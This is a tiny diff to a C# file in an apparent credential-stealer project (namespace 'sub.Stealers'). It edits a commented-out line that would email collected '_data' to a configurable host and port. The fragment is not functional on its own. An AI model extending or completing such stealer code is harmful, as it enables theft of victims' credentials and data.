@@ -74,7 +74,7 @@ namespace sub.Stealers
             {
                 Thread.Sleep((int) delay);
                 MessageBox.Show(_data);
-                //new ReportEmail(username, password).Send(_data);
+                //new ReportEmail(username, password, host, port).Send(_data);
             }
         }
 
